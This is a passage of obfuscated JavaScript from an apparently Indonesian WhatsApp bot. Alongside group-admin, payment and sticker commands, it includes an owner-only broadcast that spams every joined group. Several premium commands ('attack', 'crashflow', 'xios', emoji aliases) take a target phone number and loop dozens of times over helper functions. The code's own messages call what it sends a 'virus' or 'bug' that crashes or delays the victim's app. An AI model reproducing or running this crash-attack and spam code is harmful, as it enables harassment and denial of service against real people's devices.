‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n";
          for (let _0xb3475c of _0x5800b1) {
            _0x1bfb62 += "⊝ @" + _0xb3475c.id.split("@")[0] + "\n";
          }
          HadzzModa._0x2e9b2a(_0x516d4a._0x19b14a, {
            "text": _0x1bfb62,
            "_0x5315da": _0x5800b1.map(_0xb3e6a6 => _0xb3e6a6.id)
          }, {
            "_0x1b9bca": _0x516d4a
          });
        }
        break;
      case "kick":
        {
          if (!_0x307159) {
            return _0x105e8a("Only Group");
          }
          if (!_0x8ccd36 && !_0x1ba836) {
            return _0x105e8a("Only Admin");
          }
          if (!_0x1eabd5) {
            return _0x105e8a("Bot Bukan Admin :(");
          }
          let _0x5919bf = _0x516d4a._0x1b9bca ? _0x516d4a._0x1b9bca.sender : _0x288ff4.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x799da7._0x50b234(_0x516d4a._0x19b14a, [_0x5919bf], "remove").then(_0x371b7a => _0x105e8a(util.format(_0x371b7a)))["catch"](_0x2b36c9 => _0x105e8a(util.format(_0x2b36c9)));
        }
        break;
      case "closegroup":
        {
          if (!_0x307159) {
            return _0x105e8a("Khusus Group Bego");
          }
          if (!_0x8ccd36 && !_0x1ba836) {
            return _0x105e8a("Khusus Admin");
          }
          if (!_0x1eabd5) {
            return _0x105e8a("Bot Bukan Admin Bego");
          }
          if (!_0x1671ca[0]) {
            return _0x105e8a("*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n" + (_0x5999dc + _0x1a4aba) + "10 second");
          }
          if (_0x1671ca[1] == "second") {
            var _0x3a54ba = _0x1671ca[0] * "1000";
          } else {
            if (_0x1671ca[1] == "minute") {
              var _0x3a54ba = _0x1671ca[0] * "60000";
            } else {
              if (_0x1671ca[1] == "hour") {
                var _0x3a54ba = _0x1671ca[0] * "3600000";
              } else {
                if (_0x1671ca[1] == "day") {
                  var _0x3a54ba = _0x1671ca[0] * "86400000";
                }
              }
            }
          }
          _0x105e8a("*Waktu dimulai dari sekarang*");
          setTimeout(() => {
            _0x799da7._0x1adb70(_0x516d4a._0x19b14a, "announcement");
            _0x105e8a("Waktu Telah Tiba!\nGrup Ditutup Oleh Bot Dikarenakan Tidak Ada Yg Menjaga Grup\nGrup Akan Dibuka Sesuai Waktu Yg Ditentukan Oleh Admin");
          }, _0x3a54ba);
        }
        break;
      case "opengroup":
        {
          if (!_0x307159) {
            return _0x105e8a("Khusus Group Bego");
          }
          if (!_0x8ccd36 && !_0x1ba836) {
            return _0x105e8a("Khusus Admin");
          }
          if (!_0x1eabd5) {
            return _0x105e8a("Bot Bukan Admin Bego");
          }
          if (!_0x1671ca[0]) {
            return _0x105e8a("*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n" + (_0x5999dc + _0x1a4aba) + "10 second");
          }
          if (_0x1671ca[1] == "second") {
            var _0x3a54ba = _0x1671ca[0] * "1000";
          } else {
            if (_0x1671ca[1] == "minute") {
              var _0x3a54ba = _0x1671ca[0] * "60000";
            } else {
              if (_0x1671ca[1] == "hour") {
                var _0x3a54ba = _0x1671ca[0] * "3600000";
              } else {
                if (_0x1671ca[1] == "day") {
                  var _0x3a54ba = _0x1671ca[0] * "86400000";
                }
              }
            }
          }
          _0x105e8a("*Waktu dimulai dari sekarang*");
          setTimeout(() => {
            _0x799da7._0x1adb70(_0x516d4a._0x19b14a, "not_announcement");
            _0x105e8a("Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan");
          }, _0x3a54ba);
        }
        break;
      case "demote":
        {
          if (!_0x211fa5) {
            return _0x105e8a(mess.only._0x36cabb);
          }
          if (!_0x307159) {
            return _0x105e8a("Only Group");
          }
          if (!_0x8ccd36 && !_0x1ba836) {
            return _0x105e8a("Only Admin");
          }
          if (!_0x1eabd5) {
            return _0x105e8a("Bot Bukan Admin :(");
          }
          let _0x4353d6 = _0x516d4a._0xe6f9af[0] ? _0x516d4a._0xe6f9af[0] : _0x516d4a._0x1b9bca ? _0x516d4a._0x1b9bca.sender : _0x288ff4.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x799da7._0x50b234(_0x516d4a._0x19b14a, [_0x4353d6], "demote").then(_0xad7184 => _0x105e8a(util.format(_0xad7184)))["catch"](_0x4ec8bf => _0x105e8a(util.format(_0x4ec8bf)));
        }
        break;
      case "promote":
        {
          if (!_0x307159) {
            return _0x105e8a("Only Group");
          }
          if (!_0x8ccd36 && !_0x1ba836) {
            return _0x105e8a("Only Admin");
          }
          if (!_0x1eabd5) {
            return _0x105e8a("Bot Bukan Admin :(");
          }
          let _0x255d6b = _0x516d4a._0x1b9bca ? _0x516d4a._0x1b9bca.sender : _0x288ff4.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x799da7._0x50b234(_0x516d4a._0x19b14a, [_0x255d6b], "add").then(_0x14af4b => _0x105e8a(util.format(_0x14af4b)))["catch"](_0x3cdb4a => _0x105e8a(util.format(_0x3cdb4a)));
        }
        break;
      case "jpmpromosi":
      case "jpmpromo":
      case "jpm3":
        {
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          if (!_0x288ff4 && !_0x516d4a._0x1b9bca) {
            return _0x516d4a._0x3dfdd4("teksnya atau replyteks");
          }
          var _0x2caf11 = _0x516d4a._0x1b9bca ? _0x516d4a._0x1b9bca.text : _0x288ff4;
          let _0x55da3e = 0;
          let _0x1231be = await _0x799da7._0x4bf6a9();
          let _0x4c731b = Object.entries(_0x1231be).slice(0).map(_0x2aabce => _0x2aabce[1]);
          let _0x2516a7 = _0x4c731b.filter(_0x2ec80b => _0x2ec80b._0x80825c == false);
          let _0x13b173 = _0x2516a7.map(_0xee8189 => _0xee8189.id);
          _0x516d4a._0x3dfdd4("Memproses Mengirim Pesan Ke *" + _0x13b173.length + " Grup*");
          const _0x3a4498 = {
            _0x110705: {},
            _0xe95360: 0x2
          };
          const _0x1f316f = {
            _0x2cdeaa: true
          };
          const _0x53a16c = {
            text: _0x2caf11
          };
          const _0x27e7f2 = {
            name: "cta_url",
            _0x14eb59: "{\"display_text\":\"Testi Di whatsapp\",\"url\":\"" + isLink + "\",\"merchant_url\":\"https://whatsapp.com/channel/0029VapVjjr1noz8wOgd6144\"}"
          };
          let _0x567758 = generateWAMessageFromContent(_0x516d4a._0x19b14a, {
            "_0x48cb7a": {
              "message": {
                "messageContextInfo": _0x3a4498,
                "_0x39f8b4": proto._0x8fefb1._0x1525c2.create({
                  "_0x997701": {
                    "_0xe6f9af": [_0x516d4a.sender],
                    "_0x2d69a1": _0x1f316f
                  },
                  "body": proto._0x8fefb1._0x1525c2._0xa68fe5.create(_0x53a16c),
                  "_0x597f49": proto._0x8fefb1._0x1525c2._0x5d2380.create({
                    "buttons": [{
                      "name": "cta_url",
                      "_0x14eb59": "{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6285789034010\",\"merchant_url\":\"https://whatsapp.com/channel/0029VapVjjr1noz8wOgd6144\"}"
                    }, {
                      "name": "cta_url",
                      "_0x14eb59": "{\"display_text\":\"YouTube Owner\",\"url\":\"" + linkyt + "\",\"merchant_url\":\"https://youtube.com/@AnnasIncus\"}"
                    }, _0x27e7f2, {
                      "name": "cta_url",
                      "_0x14eb59": "{\"display_text\":\"Donate My Dev🙏\",\"url\":\"https://b.top4top.io/p_3194nb6rt0.jpeg\",\"merchant_url\":\"https://b.top4top.io/p_3194nb6rt0.jpeg\"}"
                    }]
                  })
                })
              }
            }
          }, {
            "_0x5f5834": _0x516d4a.sender,
            "_0x1b9bca": _0x516d4a
          });
          for (let _0x4de12d of _0x13b173) {
            try {
              await _0x799da7._0x35132e(_0x4de12d, _0x567758.message, {
                "_0x560a27": _0x567758.key.id
              });
              _0x55da3e += 1;
            } catch {}
            await sleep(global._0x4bafd0);
          }
          _0x516d4a._0x3dfdd4("Berhasil Mengirim Pesan Ke *" + _0x55da3e + " Grup*");
        }
        break;
      case "payment":
        {
          let _0xc2dc8b = "```PAYMENT```\n\n*(E-WALLET)*\n\n   *DANA*\n- " + dana + "\n\nHarap Setelah Transfer Anda Harus Mengasih Bukti Pembayaran Agar Di Verifikasi Oleh Owner, Tanks For You\n\n© " + storename;
          const _0x359327 = {
            _0x2cdeaa: true,
            _0x5e0007: false,
            title: "QRIS? KLIK DISINI",
            body: "Date : " + _0x1822d6 + ", " + _0x49dd55,
            _0x1c8b28: true,
            _0x48df3b: 0x1,
            _0x39631a: "https://b.top4top.io/p_3194nb6rt0.jpeg",
            _0x41fe27: '' + qris
          };
          const _0x3b6df7 = {
            _0x3d0c3e: 0x98967f,
            _0x4baafc: true,
            _0xe6f9af: [_0x516d4a.sender],
            _0x2d69a1: _0x359327
          };
          const _0xaea8b3 = {
            text: _0xc2dc8b,
            _0x997701: _0x3b6df7
          };
          const _0x591877 = {
            _0x1b9bca: _0x32f4fe
          };
          _0x799da7._0x2e9b2a(_0x23841e, _0xaea8b3, _0x591877);
          await sleep(1500);
        }
        break;
      case "danamasuk":
        {
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          let _0x25ef90 = "*DONE DANA MASUK*\n\nReqname :\n\n▰▰▰▰▰▰▰▰\n*Garansi 7 Day*\n*Create " + _0x1822d6 + "*\n*Hari Ini " + _0x41fd95 + "*";
          const _0x370c24 = {
            text: _0x25ef90
          };
          const _0x1c874c = {
            _0x1b9bca: _0x516d4a
          };
          _0x799da7._0x2e9b2a(_0x23841e, _0x370c24, _0x1c874c);
        }
        break;
      case "proses":
        {
          _0x516d4a._0x3dfdd4("*SIAP PESANAN ANDA AKAN KAMI PROSES JADI DI MOHON UNTUK MENUNGGU SEBENTAR YA MEK*");
          const _0x3e68e7 = {
            _0x3d0c3e: 0x270f,
            _0x4baafc: true
          };
          _0x799da7._0x2e9b2a("6285789034010@s.whatsapp.net", {
            "text": "BANG anas ADA YANG TRX NIH CEPETAN PROSES NANTI BUYER NGAMOK",
            "_0x997701": _0x3e68e7
          });
        }
        break;
      case "done":
      case "d":
        {
          if (!_0x1ba836) {
            return _0x105e8a("Njirr Lu siapa Cuk");
          }
          let _0x38a255 = _0x288ff4.split(",");
          let _0x10309c = _0x38a255[0];
          let _0x527cae = _0x38a255[1];
          if (_0x38a255.length < 2) {
            return _0x105e8a("*Format salah!*\nPenggunaan:\n" + (_0x5999dc + _0x1a4aba) + " barang,nominal");
          }
          if (!_0x10309c) {
            return _0x105e8a("Ex : " + (_0x5999dc + _0x1a4aba) + " barang,nominal\n\nContoh :\n" + (_0x5999dc + _0x1a4aba) + " vipies,60000");
          }
          if (!_0x527cae) {
            return _0x105e8a("Ex : " + (_0x5999dc + _0x1a4aba) + " barang,nominal\n\nContoh :\n" + (_0x5999dc + _0x1a4aba) + " panel,1000");
          }
          text_done = "「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」\n\n📦 Barang : " + _0x10309c + "\n💸 Nominal : " + _0x527cae + "\n📆 Tanggal : " + _0x1822d6 + "\n🕰️ Waktu : " + _0xd2b295 + "\n✨ Status : Berhasil\n\n𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗧𝗲𝗹𝗮𝗵 𝗢𝗿𝗱𝗲𝗿 𝗗𝗶 *" + storename + "*";
          const _0x2b9082 = {
            "_0x2cdeaa": true
          };
          const _0x41ca48 = {
            _0x2d69a1: _0x2b9082
          };
          const _0x5a801e = {
            text: text_done,
            _0x997701: _0x41ca48
          };
          const _0x222095 = {
            extendedTextMessage: _0x5a801e
          };
          await _0x799da7._0x35132e(_0x516d4a._0x19b14a, {
            "_0x32a0ce": {
              "_0xddccc3": "IDR",
              "_0x522bd5": _0x527cae + "*100000",
              "_0x5a4825": _0x516d4a.sender,
              "_0x19a0f2": _0x222095
            }
          }, {});
        }
        break;
      case "sticker":
      case "stiker":
      case "s":
        {
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          if (!_0xae93d7) {
            return _0x105e8a("Kirim/Reply Gambar/Video/Gifs Dengan Caption " + (_0x5999dc + _0x1a4aba) + "\nDurasi Video 1-9 Detik");
          }
          if (/image/.test(_0xc51d19)) {
            let _0x230a42 = await _0xae93d7.download();
            const _0x3725b7 = {
              _0x289576: global._0x289576,
              _0x7bab3f: global._0x7bab3f
            };
            let _0x43570c = await _0x799da7._0x56f84a(_0x23841e, _0x230a42, _0x516d4a, _0x3725b7);
            await fs._0x6a8190(_0x43570c);
          } else {
            if (/video/.test(_0xc51d19)) {
              if ((_0xae93d7._0x1c69dd || _0xae93d7)._0x9729bf > 11) {
                return _0x105e8a("Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik");
              }
              let _0x1df84e = await _0xae93d7.download();
              const _0x229e50 = {
                _0x289576: global._0x289576,
                _0x7bab3f: global._0x7bab3f
              };
              let _0xa8766c = await _0x799da7._0x5215bd(_0x23841e, _0x1df84e, _0x516d4a, _0x229e50);
              await fs._0x6a8190(_0xa8766c);
            } else {
              _0x105e8a("Kirim/Reply Gambar/Video/Gifs Dengan Caption " + (_0x5999dc + _0x1a4aba) + "\nDurasi Video 1-9 Detik");
            }
          }
        }
        break;
      case "stuk":
      case "flow":
        if (!_0x211fa5) {
          return _0x105e8a(mess.only._0x36cabb);
        }
        if (!q) {
          return _0x105e8a("Example: " + (_0x5999dc + _0x1a4aba) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x105e8a("𝙎𝙀𝘿𝘼𝙉𝙂 𝙀𝙒𝙀𝙆 𝘿𝙐𝙇𝙐 𝙔𝘼 𝙈𝘼𝙎𝙎 𝙈𝘼𝙎𝙄𝙃 𝘿𝙄 𝙋𝙍𝙊𝙎𝙀𝙎 𝙊𝙆𝙀");
        for (let _0x44cbfc = 0; _0x44cbfc < 50; _0x44cbfc++) {
          await _0x5311d1(_0x799da7, target, "𝙔𝙏 : 𝘼𝙉𝘼𝙎𝙄𝙉𝘾𝙐𝙎 🔥", 20000, ptcp = true);
          _0x420f89(target, _0x2a6fa3);
          await sleep(1500);
          await _0x420f89(target, _0x2a6fa3);
          await _0x5cf846(_0x799da7, target, _0x2a6fa3);
          await _0x2fe929(target, _0x2a6fa3);
          await _0x5cf846(_0x799da7, target, _0x2a6fa3);
        }
        _0x105e8a("『 𝙎𝙀𝙉𝘿 𝘽𝙐𝙂 𝙆𝙀 𝙏𝘼𝙍𝙂𝙀𝙏𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
        break;
      case "fuck":
      case "apalah":
      case "anjing":
      case "ampas":
      case "dor🔫":
      case "😀":
      case "😃":
      case "😄":
      case "😁":
      case "😆":
      case "😅":
      case "😂":
      case "🤣":
        if (!_0x211fa5) {
          return _0x105e8a(mess.only._0x36cabb);
        }
        if (!q) {
          return _0x105e8a("Example: " + (_0x5999dc + _0x1a4aba) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x105e8a("𝙎𝙀𝘿𝘼𝙉𝙂 𝙀𝙒𝙀𝙆 𝘿𝙐𝙇𝙐 𝙔𝘼 𝙈𝘼𝙎𝙎 𝙈𝘼𝙎𝙄𝙃 𝘿𝙄 𝙋𝙍𝙊𝙎𝙀𝙎 𝙊𝙆𝙀");
        for (let _0x2b6089 = 0; _0x2b6089 < 50; _0x2b6089++) {
          await _0x5311d1(_0x799da7, target, "𝙔𝙏 : 𝘼𝙉𝘼𝙎𝙄𝙉𝘾𝙐𝙎 🔥", 20000, ptcp = true);
          _0x420f89(target, _0x2a6fa3);
          await sleep(1500);
          await _0x2fe929(target, _0x2a6fa3);
          await _0x5cf846(_0x799da7, target, _0x2a6fa3);
        }
        _0x105e8a("『 𝙎𝙀𝙉𝘿 𝘽𝙐𝙂 𝙆𝙀 𝙏𝘼𝙍𝙂𝙀𝙏𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
        break;
      case "ewek":
      case "🥶":
      case "🤡":
        if (!_0x211fa5) {
          return _0x105e8a(mess.only._0x36cabb);
        }
        if (!q) {
          return _0x105e8a("Example: " + (_0x5999dc + _0x1a4aba) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x105e8a("𝙎𝙀𝘿𝘼𝙉𝙂 𝙀𝙒𝙀𝙆 𝘿𝙐𝙇𝙐 𝙔𝘼 𝙈𝘼𝙎𝙎 𝙈𝘼𝙎𝙄𝙃 𝘿𝙄 𝙋𝙍𝙊𝙎𝙀𝙎 𝙊𝙆𝙀");
        for (let _0x59ca85 = 0; _0x59ca85 < 50; _0x59ca85++) {
          await _0x5311d1(_0x799da7, target, "𝙔𝙏 : 𝘼𝙉𝘼𝙎𝙄𝙉𝘾𝙐𝙎 🔥", 20000, ptcp = true);
          _0x420f89(target, _0x2a6fa3);
          await sleep(1500);
          await _0x420f89(target, _0x2a6fa3);
          await _0x5cf846(_0x799da7, target, _0x2a6fa3);
          await _0x2fe929(target, _0x2a6fa3);
          await _0x5cf846(_0x799da7, target, _0x2a6fa3);
        }
        _0x105e8a("『 𝙎𝙀𝙉𝘿 𝘽𝙐𝙂 𝙆𝙀 𝙏𝘼𝙍𝙂𝙀𝙏𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
        break;
      case "vip":
      case "attack":
      case "andro":
        if (!_0x211fa5) {
          return _0x105e8a(mess.only._0x36cabb);
        }
        if (!q) {
          return _0x105e8a("Example: " + (_0x5999dc + _0x1a4aba) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x105e8a("𝙎𝙀𝘿𝘼𝙉𝙂 𝙀𝙒𝙀𝙆 𝘿𝙐𝙇𝙐 𝙔𝘼 𝙈𝘼𝙎𝙎 𝙈𝘼𝙎𝙄𝙃 𝘿𝙄 𝙋𝙍𝙊𝙎𝙀𝙎 𝙊𝙆𝙀");
        for (let _0x156d2a = 0; _0x156d2a < 30; _0x156d2a++) {
          await _0x5311d1(_0x799da7, target, "𝙔𝙏 : 𝘼𝙉𝘼𝙎𝙄𝙉𝘾𝙐𝙎 🔥", 20000, ptcp = true);
          _0x420f89(target, _0x2a6fa3);
          await sleep(1500);
          await _0x420f89(target, _0x2a6fa3);
          await _0x5cf846(_0x799da7, target, _0x2a6fa3);
          await _0x2fe929(target, _0x2a6fa3);
          await _0x5cf846(_0x799da7, target, _0x2a6fa3);
        }
        _0x105e8a("『 𝙎𝙀𝙉𝘿 𝘽𝙐𝙂 𝙆𝙀 𝙏𝘼𝙍𝙂𝙀𝙏𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
        break;
      case "🥵":
      case "xios":
      case "iphone":
      case "xip":
        if (!_0x211fa5) {
          return _0x105e8a(mess.only._0x36cabb);
        }
        if (!q) {
          return _0x105e8a("Example: " + (_0x5999dc + _0x1a4aba) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x105e8a("𝙎𝙀𝘿𝘼𝙉𝙂 𝙀𝙒𝙀𝙆 𝘿𝙐𝙇𝙐 𝙔𝘼 𝙈𝘼𝙎𝙎 𝙈𝘼𝙎𝙄𝙃 𝘿𝙄 𝙋𝙍𝙊𝙎𝙀𝙎 𝙊𝙆𝙀");
        for (let _0x5f4508 = 0; _0x5f4508 < 40; _0x5f4508++) {
          await _0x5311d1(_0x799da7, target, "𝙔𝙏 : 𝘼𝙉𝘼𝙎𝙄𝙉𝘾𝙐𝙎 🔥", 20000, ptcp = true);
          _0x420f89(target, _0x2a6fa3);
          await sleep(1500);
          await _0x420f89(target, _0x2a6fa3);
          await _0x5cf846(_0x799da7, target, _0x2a6fa3);
          await _0x2fe929(target, _0x2a6fa3);
          await _0x5cf846(_0x799da7, target, _0x2a6fa3);
        }
        _0x105e8a("『 𝙎𝙀𝙉𝘿 𝘽𝙐𝙂 𝙆𝙀 𝙏𝘼𝙍𝙂𝙀𝙏𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
        break;
      case "overflow":
      case "vasion":
      case "crashflow":
        if (!_0x211fa5) {
          return _0x105e8a(mess.only._0x36cabb);
        }
        if (!q) {
          return _0x105e8a("Example: " + (_0x5999dc + _0x1a4aba) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x105e8a("𝙎𝙀𝘿𝘼𝙉𝙂 𝙀𝙒𝙀𝙆 𝘿𝙐𝙇𝙐 𝙔𝘼 𝙈𝘼𝙎𝙎 𝙈𝘼𝙎𝙄𝙃 𝘿𝙄 𝙋𝙍𝙊𝙎𝙀𝙎 𝙊𝙆𝙀");
        for (let _0x21223a = 0; _0x21223a < 40; _0x21223a++) {
          await _0x5311d1(_0x799da7, target, "𝙔𝙏 : 𝘼𝙉𝘼𝙎𝙄𝙉𝘾𝙐𝙎 🔥", 20000, ptcp = true);
          _0x420f89(target, _0x2a6fa3);
          await sleep(1500);
          await _0x420f89(target, _0x2a6fa3);
          await _0x5cf846(_0x799da7, target, _0x2a6fa3);
          await _0x2fe929(target, _0x2a6fa3);
          await _0x5cf846(_0x799da7, target, _0x2a6fa3);
        }
        _0x105e8a("『 𝙎𝙀𝙉𝘿 𝘽𝙐𝙂 𝙆𝙀 𝙏𝘼𝙍𝙂𝙀𝙏𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n    𝐍𝐎𝐓𝐄\n> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker");
        break;
      case "owner":
        {
          if (!_0x211fa5) {
            return _0x105e8a("Mau Ngapain Dek ??");
          }
          const _0x28e04a = {
            displayName: _0x3d22c6.length + " Kontak",
            _0x446d4f: _0x3d22c6
          };
          const _0x2cdcce = {
            _0x3d0c3e: 0x98967f,
            _0x4baafc: true,
            _0xe6f9af: [_0x1b5b85]
          };
          const _0x15e967 = {
            _0x446d4f: _0x28e04a,
            _0x997701: _0x2cdcce
          };
          const _0x3250b5 = {
            _0x1b9bca: _0x516d4a
          };
          const _0x548741 = await _0x799da7._0x2e9b2a(_0x23841e, _0x15e967, _0x3250b5);
          const _0x66260c = {
            _0x3d0c3e: 0x98967f,
            _0x4baafc: true,
            _0xe6f9af: [_0x1b5b85]
          };
          const _0x149efd = {
            text: "Nih Owner Gw Jangan Macem\"",
            _0x997701: _0x66260c
          };
          const _0x5d8c9c = {
            _0x1b9bca: _0x548741
          };
          _0x799da7._0x2e9b2a(_0x23841e, _0x149efd, _0x5d8c9c);
        }
        break;
      case "addowner":
        if (!_0x1ba836) {
          return _0x105e8a(mess.only.owner);
        }
        if (!_0x1671ca[0]) {
          return _0x105e8a("Penggunaan " + (_0x5999dc + _0x1a4aba) + " nomor\nContoh " + (_0x5999dc + _0x1a4aba) + " 62×××");
        }
        bnnd = q.split("|")[0].replace(/[^0-9]/g, '');
        let _0x817e42 = await _0x799da7._0x1e1ae5(bnnd + "@s.whatsapp.net");
        if (_0x817e42.length == 0) {
          return _0x105e8a("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!");
        }
        _0x17bc0f.push(bnnd);
        fs._0x310981("./database/dtbs/owner.json", JSON.stringify(_0x17bc0f));
        _0x105e8a("Nomor " + bnnd + " Telah Menjadi Owner!!!");
        break;
      case "delowner":
        if (!_0x1ba836) {
          return _0x105e8a(mess.only.owner);
        }
        if (!_0x1671ca[0]) {
          return _0x105e8a("Penggunaan " + (_0x5999dc + _0x1a4aba) + " nomor\nContoh " + (_0x5999dc + _0x1a4aba) + " 62×××");
        }
        ya = q.split("|")[0].replace(/[^0-9]/g, '');
        unp = _0x17bc0f.indexOf(ya);
        _0x17bc0f.splice(unp, 1);
        fs._0x310981("./database/dtbs/owner.json", JSON.stringify(_0x17bc0f));
        _0x105e8a("Nomor " + ya + " Telah Di Hapus Owner!!!");
        break;
      case "setowner":
        {
          if (!_0x1ba836) {
            return _0x105e8a("kusus owner");
          }
          if (!_0x288ff4) {
            return _0x105e8a("Contoh : " + (_0x5999dc + _0x1a4aba) + " 62×××");
          }
          global.owner = _0x288ff4.split("|")[0];
          _0x105e8a("Exif berhasil diubah menjadi\n\n• No Owner : " + global.owner);
        }
        break;
      case "self":
        {
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          _0x799da7["public"] = false;
          _0x105e8a("Succes Mode Private");
        }
        break;
      case "addprem":
        {
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          if (!_0x1671ca[0]) {
            return _0x105e8a("Penggunaan " + (_0x5999dc + _0x1a4aba) + " nomor\nContoh " + (_0x5999dc + _0x1a4aba) + " 62×××");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          let _0xb2ee7 = await _0x799da7._0x1e1ae5(prrkek);
          if (_0xb2ee7.length == 0) {
            return _0x105e8a("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!");
          }
          _0x1426bc.push(prrkek);
          fs._0x310981("./database/dtbs/premium.json", JSON.stringify(_0x1426bc));
          _0x105e8a("Nomor " + prrkek + " Telah Menjadi Premium!");
        }
        break;
      case "delprem":
        {
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          if (!_0x1671ca[0]) {
            return _0x105e8a("Penggunaan " + (_0x5999dc + _0x1a4aba) + " nomor\nContoh " + (_0x5999dc + _0x1a4aba) + " 62×××");
          }
          ya = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          unp = _0x1426bc.indexOf(ya);
          _0x1426bc.splice(unp, 1);
          fs._0x310981("./database/dtbs/premium.json", JSON.stringify(_0x1426bc));
          _0x105e8a("Nomor " + ya + " Telah Di Hapus Premium!");
        }
        break;
      case "public":
        {
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          _0x799da7["public"] = true;
          _0x105e8a("Succes Mode Public");
        }
        break;
      case "qc":
        {
          if (!_0x1ba836) {
            return _0x105e8a(mess.only.owner);
          }
          if (!_0xae93d7) {} else {
            if (q) {} else {
              _0x105e8a("Kirim perintah " + (_0x5999dc + _0x1a4aba) + " 〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼");
            }
          }
        }
        break;
      case "mangap":
        {
          _0x105e8a("Makasi Kakak " + _0x1d0560 + " Atas Pujiannya");
        }
        break;
      case "ai":
        {
          if (!_0x288ff4) {
            return _0x105e8a("*• Example:* " + (_0x5999dc + _0x1a4aba) + " Siapakah orang yang telah menemukan Komputer di jaman Majapahit");
          }
          await _0x799da7._0x2e9b2a(_0x516d4a._0x19b14a, {
            "_0x390ebc": {
              "text": "⏱️",
              "key": _0x516d4a.key
            }
          });
          try {
